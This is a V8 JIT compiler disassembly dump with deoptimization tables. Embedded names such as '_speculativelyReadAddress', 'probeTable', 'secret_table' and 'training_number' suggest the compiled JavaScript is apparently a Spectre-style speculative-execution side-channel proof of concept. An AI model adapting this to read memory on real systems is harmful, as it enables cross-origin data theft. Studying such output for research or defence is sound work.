0x622d186d336   616  4c8b4da0       REX.W movq r9,[rbp-0x60]
0x622d186d33a   61a  488b8570ffffff REX.W movq rax,[rbp-0x90]
0x622d186d341   621  488b8d50ffffff REX.W movq rcx,[rbp-0xb0]
0x622d186d348   628  49be81476012c0080000 REX.W movq r14,0x8c012604781    ;; object: 0x08c012604781 <Map(UINT8_ELEMENTS)>
0x622d186d352   632  488b9d48ffffff REX.W movq rbx,[rbp-0xb8]
0x622d186d359   639  e9f3fcffff     jmp 0x622d186d051  <+0x331>
                  -- B40 start (deferred) (in loop 31) --
                  -- <not inlined:1175> --
0x622d186d35e   63e  488b8538ffffff REX.W movq rax,[rbp-0xc8]
0x622d186d365   645  0bc6           orl rax,rsi
0x622d186d367   647  48898d50ffffff REX.W movq [rbp-0xb0],rcx
0x622d186d36e   64e  83f800         cmpl rax,0x0
0x622d186d371   651  0f8cfa020000   jl 0x622d186d671  <+0x951>
0x622d186d377   657  488b5580       REX.W movq rdx,[rbp-0x80]
0x622d186d37b   65b  4c8b4da0       REX.W movq r9,[rbp-0x60]
0x622d186d37f   65f  488b8570ffffff REX.W movq rax,[rbp-0x90]
0x622d186d386   666  488b8d50ffffff REX.W movq rcx,[rbp-0xb0]
0x622d186d38d   66d  49be81476012c0080000 REX.W movq r14,0x8c012604781    ;; object: 0x08c012604781 <Map(UINT8_ELEMENTS)>
0x622d186d397   677  488b9d48ffffff REX.W movq rbx,[rbp-0xb8]
0x622d186d39e   67e  e9c9fcffff     jmp 0x622d186d06c  <+0x34c>
                  -- B54 start (deferred) --
0x622d186d3a3   683  488bd9         REX.W movq rbx,rcx
0x622d186d3a6   686  48c1e320       REX.W shlq rbx, 32
0x622d186d3aa   68a  48898568ffffff REX.W movq [rbp-0x98],rax
0x622d186d3b1   691  e949000000     jmp 0x622d186d3ff  <+0x6df>
                  -- B55 start (deferred) --
0x622d186d3b6   696  488bc1         REX.W movq rax,rcx
0x622d186d3b9   699  48c1e020       REX.W shlq rax, 32
0x622d186d3bd   69d  48898558ffffff REX.W movq [rbp-0xa8],rax
0x622d186d3c4   6a4  4c899d50ffffff REX.W movq [rbp-0xb0],r11
0x622d186d3cb   6ab  e975000000     jmp 0x622d186d445  <+0x725>
                  -- B56 start (deferred) --
                  -- <not inlined:1314> --
0x622d186d3d0   6b0  488bc1         REX.W movq rax,rcx
0x622d186d3d3   6b3  48c1e020       REX.W shlq rax, 32
0x622d186d3d7   6b7  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x622d186d3de   6be  4c899568ffffff REX.W movq [rbp-0x98],r10
0x622d186d3e5   6c5  4c898558ffffff REX.W movq [rbp-0xa8],r8
0x622d186d3ec   6cc  48898550ffffff REX.W movq [rbp-0xb0],rax
0x622d186d3f3   6d3  e997000000     jmp 0x622d186d48f  <+0x76f>
                  -- B57 start (deferred) --
0x622d186d3f8   6d8  48898d68ffffff REX.W movq [rbp-0x98],rcx
                  -- B58 start (deferred) --
0x622d186d3ff   6df  48b8315cf983272c0000 REX.W movq rax,0x2c2783f95c31    ;; object: 0x2c2783f95c31 <String[4]: junk>
0x622d186d409   6e9  50             push rax
                  -- <not inlined:1723> --
0x622d186d40a   6ea  4c89a550ffffff REX.W movq [rbp-0xb0],r12
0x622d186d411   6f1  48899d58ffffff REX.W movq [rbp-0xa8],rbx
0x622d186d418   6f8  4c898560ffffff REX.W movq [rbp-0xa0],r8
0x622d186d41f   6ff  48bb108c190100000000 REX.W movq rbx,0x1198c10
0x622d186d429   709  b801000000     movl rax,0x1
0x622d186d42e   70e  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d432   712  e8c926f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B59 start (deferred) --
0x622d186d437   717  48899d58ffffff REX.W movq [rbp-0xa8],rbx
0x622d186d43e   71e  4c898d50ffffff REX.W movq [rbp-0xb0],r9
                  -- B60 start (deferred) --
0x622d186d445   725  48b8315df983272c0000 REX.W movq rax,0x2c2783f95d31    ;; object: 0x2c2783f95d31 <String[12]: secret_table>
0x622d186d44f   72f  50             push rax
                  -- <not inlined:1538> --
0x622d186d450   730  4c898560ffffff REX.W movq [rbp-0xa0],r8
0x622d186d457   737  4889bd68ffffff REX.W movq [rbp-0x98],rdi
0x622d186d45e   73e  488b1dbcffffff REX.W movq rbx,[rip+0xffffffbc]
0x622d186d465   745  b801000000     movl rax,0x1
0x622d186d46a   74a  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d46e   74e  e88d26f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B61 start (deferred) --
0x622d186d473   753  4889b568ffffff REX.W movq [rbp-0x98],rsi
0x622d186d47a   75a  4c8b9550ffffff REX.W movq r10,[rbp-0xb0]
0x622d186d481   761  4c899558ffffff REX.W movq [rbp-0xa8],r10
0x622d186d488   768  48899d50ffffff REX.W movq [rbp-0xb0],rbx
                  -- B62 start (deferred) --
0x622d186d48f   76f  48b8315cf983272c0000 REX.W movq rax,0x2c2783f95c31    ;; object: 0x2c2783f95c31 <String[4]: junk>
0x622d186d499   779  50             push rax
                  -- <not inlined:1314> --
0x622d186d49a   77a  4c899d48ffffff REX.W movq [rbp-0xb8],r11
0x622d186d4a1   781  4889bd60ffffff REX.W movq [rbp-0xa0],rdi
0x622d186d4a8   788  488b1d72ffffff REX.W movq rbx,[rip+0xffffff72]
0x622d186d4af   78f  b801000000     movl rax,0x1
0x622d186d4b4   794  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d4b8   798  e84326f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B63 start (deferred) --
0x622d186d4bd   79d  48b8a95cf983272c0000 REX.W movq rax,0x2c2783f95ca9    ;; object: 0x2c2783f95ca9 <String[9]: page_size>
0x622d186d4c7   7a7  50             push rax
                  -- <not inlined:1165> --
0x622d186d4c8   7a8  48899d68ffffff REX.W movq [rbp-0x98],rbx
0x622d186d4cf   7af  4889b560ffffff REX.W movq [rbp-0xa0],rsi
0x622d186d4d6   7b6  4889bd58ffffff REX.W movq [rbp-0xa8],rdi
0x622d186d4dd   7bd  4c898550ffffff REX.W movq [rbp-0xb0],r8
0x622d186d4e4   7c4  488b1d36ffffff REX.W movq rbx,[rip+0xffffff36]
0x622d186d4eb   7cb  b801000000     movl rax,0x1
0x622d186d4f0   7d0  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d4f4   7d4  e80726f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B64 start (deferred) --
0x622d186d4f9   7d9  48b84125d03b2a3b0000 REX.W movq rax,0x3b2a3bd02541    ;; object: 0x3b2a3bd02541 <String[7]: address>
0x622d186d503   7e3  50             push rax
                  -- <not inlined:1103> --
0x622d186d504   7e4  48899d68ffffff REX.W movq [rbp-0x98],rbx
0x622d186d50b   7eb  4889b560ffffff REX.W movq [rbp-0xa0],rsi
0x622d186d512   7f2  48898d58ffffff REX.W movq [rbp-0xa8],rcx
0x622d186d519   7f9  488b1d01ffffff REX.W movq rbx,[rip+0xffffff01]
0x622d186d520   800  b801000000     movl rax,0x1
0x622d186d525   805  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d529   809  e8d225f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B65 start (deferred) --
0x622d186d52e   80e  48b8815cf983272c0000 REX.W movq rax,0x2c2783f95c81    ;; object: 0x2c2783f95c81 <String[15]: training_number>
0x622d186d538   818  50             push rax
                  -- <not inlined:931> --
0x622d186d539   819  48899d68ffffff REX.W movq [rbp-0x98],rbx
0x622d186d540   820  488b1ddafeffff REX.W movq rbx,[rip+0xfffffeda]
0x622d186d547   827  b801000000     movl rax,0x1
0x622d186d54c   82c  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d550   830  e8ab25f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B66 start (deferred) --
0x622d186d555   835  48b8a95cf983272c0000 REX.W movq rax,0x2c2783f95ca9    ;; object: 0x2c2783f95ca9 <String[9]: page_size>
0x622d186d55f   83f  50             push rax
                  -- <not inlined:898> --
0x622d186d560   840  48898d68ffffff REX.W movq [rbp-0x98],rcx
0x622d186d567   847  488b1db3feffff REX.W movq rbx,[rip+0xfffffeb3]
0x622d186d56e   84e  b801000000     movl rax,0x1
0x622d186d573   853  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d577   857  e88425f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B67 start (deferred) --
0x622d186d57c   85c  48b8515cf983272c0000 REX.W movq rax,0x2c2783f95c51    ;; object: 0x2c2783f95c51 <String[23]: speculative_repetitions>
0x622d186d586   866  50             push rax
                  -- <not inlined:819> --
0x622d186d587   867  48899d70ffffff REX.W movq [rbp-0x90],rbx
0x622d186d58e   86e  488b1d8cfeffff REX.W movq rbx,[rip+0xfffffe8c]
0x622d186d595   875  b801000000     movl rax,0x1
0x622d186d59a   87a  488b7580       REX.W movq rsi,[rbp-0x80]
0x622d186d59e   87e  e85d25f6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x622d186d5a3   883  90             nop
0x622d186d5a4   884  e8976a0100     call 0x622d1884040       ;; debug: deopt position, script offset '817'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 0
                                                             ;; eager deoptimization bailout 0
0x622d186d5a9   889  e8976a0100     call 0x622d1884045       ;; debug: deopt position, script offset '817'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 1
                                                             ;; eager deoptimization bailout 1
0x622d186d5ae   88e  e8976a0100     call 0x622d188404a       ;; debug: deopt position, script offset '896'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 2
                                                             ;; eager deoptimization bailout 2
0x622d186d5b3   893  e8976a0100     call 0x622d188404f       ;; debug: deopt position, script offset '896'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 3
                                                             ;; eager deoptimization bailout 3
0x622d186d5b8   898  e8976a0900     call 0x622d1904054       ;; debug: deopt position, script offset '879'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 4
                                                             ;; lazy deoptimization bailout 4
0x622d186d5bd   89d  e8976a0100     call 0x622d1884059       ;; debug: deopt position, script offset '950'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 5
                                                             ;; eager deoptimization bailout 5
0x622d186d5c2   8a2  e8976a0100     call 0x622d188405e       ;; debug: deopt position, script offset '1111'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 6
                                                             ;; eager deoptimization bailout 6
0x622d186d5c7   8a7  e8976a0100     call 0x622d1884063       ;; debug: deopt position, script offset '1111'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 7
                                                             ;; eager deoptimization bailout 7
0x622d186d5cc   8ac  e8976a0100     call 0x622d1884068       ;; debug: deopt position, script offset '1175'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 8
                                                             ;; eager deoptimization bailout 8
0x622d186d5d1   8b1  e8976a0100     call 0x622d188406d       ;; debug: deopt position, script offset '1175'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 9
                                                             ;; eager deoptimization bailout 9
0x622d186d5d6   8b6  e8976a0100     call 0x622d1884072       ;; debug: deopt position, script offset '1336'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 10
                                                             ;; eager deoptimization bailout 10
0x622d186d5db   8bb  e8976a0100     call 0x622d1884077       ;; debug: deopt position, script offset '1461'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 11
                                                             ;; eager deoptimization bailout 11
0x622d186d5e0   8c0  e8976a0100     call 0x622d188407c       ;; debug: deopt position, script offset '1461'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 12
                                                             ;; eager deoptimization bailout 12
0x622d186d5e5   8c5  e8976a0100     call 0x622d1884081       ;; debug: deopt position, script offset '1550'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'Smi'
                                                             ;; debug: deopt index 13
                                                             ;; eager deoptimization bailout 13
0x622d186d5ea   8ca  e8976a0100     call 0x622d1884086       ;; debug: deopt position, script offset '1550'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 14
                                                             ;; eager deoptimization bailout 14
0x622d186d5ef   8cf  e8976a0100     call 0x622d188408b       ;; debug: deopt position, script offset '1550'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 15
                                                             ;; eager deoptimization bailout 15
0x622d186d5f4   8d4  e8976a0100     call 0x622d1884090       ;; debug: deopt position, script offset '1762'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 16
                                                             ;; eager deoptimization bailout 16
0x622d186d5f9   8d9  e8976a0100     call 0x622d1884095       ;; debug: deopt position, script offset '1742'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'Smi'
                                                             ;; debug: deopt index 17
                                                             ;; eager deoptimization bailout 17
0x622d186d5fe   8de  e8976a0100     call 0x622d188409a       ;; debug: deopt position, script offset '1742'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 18
                                                             ;; eager deoptimization bailout 18
0x622d186d603   8e3  e8976a0100     call 0x622d188409f       ;; debug: deopt position, script offset '1742'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 19
                                                             ;; eager deoptimization bailout 19
0x622d186d608   8e8  e8976a0100     call 0x622d18840a4       ;; debug: deopt position, script offset '957'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 20
                                                             ;; eager deoptimization bailout 20
0x622d186d60d   8ed  e8976a0100     call 0x622d18840a9       ;; debug: deopt position, script offset '1111'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 21
                                                             ;; eager deoptimization bailout 21
0x622d186d612   8f2  e8976a0100     call 0x622d18840ae       ;; debug: deopt position, script offset '1175'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 22
                                                             ;; eager deoptimization bailout 22
0x622d186d617   8f7  e8976a0100     call 0x622d18840b3       ;; debug: deopt position, script offset '1336'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 23
                                                             ;; eager deoptimization bailout 23
0x622d186d61c   8fc  e8976a0100     call 0x622d18840b8       ;; debug: deopt position, script offset '1461'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 24
                                                             ;; eager deoptimization bailout 24
0x622d186d621   901  e8976a0100     call 0x622d18840bd       ;; debug: deopt position, script offset '1550'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'Smi'
                                                             ;; debug: deopt index 25
                                                             ;; eager deoptimization bailout 25
0x622d186d626   906  e8976a0100     call 0x622d18840c2       ;; debug: deopt position, script offset '1550'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 26
                                                             ;; eager deoptimization bailout 26
0x622d186d62b   90b  e8976a0100     call 0x622d18840c7       ;; debug: deopt position, script offset '1550'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 27
                                                             ;; eager deoptimization bailout 27
0x622d186d630   910  e8976a0100     call 0x622d18840cc       ;; debug: deopt position, script offset '1762'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 28
                                                             ;; eager deoptimization bailout 28
0x622d186d635   915  e8976a0100     call 0x622d18840d1       ;; debug: deopt position, script offset '1742'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'Smi'
                                                             ;; debug: deopt index 29
                                                             ;; eager deoptimization bailout 29
0x622d186d63a   91a  e8976a0100     call 0x622d18840d6       ;; debug: deopt position, script offset '1742'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 30
                                                             ;; eager deoptimization bailout 30
0x622d186d63f   91f  e8976a0100     call 0x622d18840db       ;; debug: deopt position, script offset '1742'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 31
                                                             ;; eager deoptimization bailout 31
0x622d186d644   924  e8976a0100     call 0x622d18840e0       ;; debug: deopt position, script offset '957'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 32
                                                             ;; eager deoptimization bailout 32
0x622d186d649   929  e8976a0100     call 0x622d18840e5       ;; debug: deopt position, script offset '846'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'overflow'
                                                             ;; debug: deopt index 33
                                                             ;; eager deoptimization bailout 33
0x622d186d64e   92e  e8976a0100     call 0x622d18840ea       ;; debug: deopt position, script offset '1846'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong call target'
                                                             ;; debug: deopt index 34
                                                             ;; eager deoptimization bailout 34
0x622d186d653   933  e8976a0900     call 0x622d19040ef       ;; debug: deopt position, script offset '799'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 35
                                                             ;; lazy deoptimization bailout 35
0x622d186d658   938  e8976a0900     call 0x622d19040f4       ;; debug: deopt position, script offset '918'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 36
                                                             ;; lazy deoptimization bailout 36
0x622d186d65d   93d  e8976a0100     call 0x622d18840f9       ;; debug: deopt position, script offset '1111'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 37
                                                             ;; eager deoptimization bailout 37
0x622d186d662   942  e8976a0100     call 0x622d18840fe       ;; debug: deopt position, script offset '1175'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 38
                                                             ;; eager deoptimization bailout 38
0x622d186d667   947  e8976a0900     call 0x622d1904103       ;; debug: deopt position, script offset '918'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 39
                                                             ;; lazy deoptimization bailout 39
0x622d186d66c   94c  e8976a0100     call 0x622d1884108       ;; debug: deopt position, script offset '1111'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 40
                                                             ;; eager deoptimization bailout 40
0x622d186d671   951  e8976a0100     call 0x622d188410d       ;; debug: deopt position, script offset '1175'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'minus zero'
                                                             ;; debug: deopt index 41
                                                             ;; eager deoptimization bailout 41
0x622d186d676   956  e8976a0900     call 0x622d1904112       ;; debug: deopt position, script offset '1723'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 42
                                                             ;; lazy deoptimization bailout 42
0x622d186d67b   95b  e8976a0900     call 0x622d1904117       ;; debug: deopt position, script offset '1538'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 43
                                                             ;; lazy deoptimization bailout 43
0x622d186d680   960  e8976a0900     call 0x622d190411c       ;; debug: deopt position, script offset '1314'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 44
                                                             ;; lazy deoptimization bailout 44
0x622d186d685   965  e8976a0900     call 0x622d1904121       ;; debug: deopt position, script offset '1165'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 45
                                                             ;; lazy deoptimization bailout 45
0x622d186d68a   96a  e8976a0900     call 0x622d1904126       ;; debug: deopt position, script offset '1103'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 46
                                                             ;; lazy deoptimization bailout 46
0x622d186d68f   96f  e8976a0900     call 0x622d190412b       ;; debug: deopt position, script offset '931'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 47
                                                             ;; lazy deoptimization bailout 47
0x622d186d694   974  e8976a0900     call 0x622d1904130       ;; debug: deopt position, script offset '898'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 48
                                                             ;; lazy deoptimization bailout 48
0x622d186d699   979  e8976a0900     call 0x622d1904135       ;; debug: deopt position, script offset '819'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 49
                                                             ;; lazy deoptimization bailout 49
0x622d186d69e   97e  6690           nop
                  ;;; Safepoint table.

Source positions:
 pc offset  position
         0       330
        40       817
        44       819
        4e       817
        70       799
        7d       879
        81       898
        8b       896
        a3       879
        d9       931
        f2       950
       10e       918
       11b      1103
       11f      1058
       134      1103
       13e      1111
       167      1165
       175      1175
       1ab      1314
       1b9      1336
       1d3      1319
       1de      1461
       228      1483
       23a      1538
       248      1550
       279      1723
       283      1746
       286      1762
       290      1742
       2b4      1780
       2ba      1742
       2cf      1728
       2d7       957
       2f0       950
       2f9       918
       306      1058
       311      1111
       331      1175
       34c      1314
       35a      1336
       36a      1723
       371      1336
       37b      1319
       37f      1461
       39b      1483
       3a4      1538
       3b2      1550
       3e3      1723
       3ed      1746
       3f0      1762
       3fa      1742
       41a      1780
       41f      1742
       434      1728
       43c       957
       457       846
       46b       817
       481      1846
       49b      1871
       4a6       799
       4dd       918
       50d      1111
       55d      1175
       5b4       918
       5f9      1111
       63e      1175
       6b0      1314
       6ea      1723
       730      1538
       77a      1314
       7a8      1165
       7e4      1103
       819       931
       840       898
       867       819

Inlined functions (count = 1)
 0x2c2783f96121 <SharedFunctionInfo probeTable>

Deoptimization Input Data (deopt points = 50)
 index  bytecode-offset    pc  commands
     0               44    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=44, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
                               REGISTER {input=rax}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     1               44    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=44, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
                               REGISTER {input=rax}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     2               44    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=44, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
                               REGISTER {input=rax}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     3               44    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=44, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
                               REGISTER {input=rax}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rbx}
     4              689    d9  BEGIN {frame count=3, js frame count=2, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=66, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
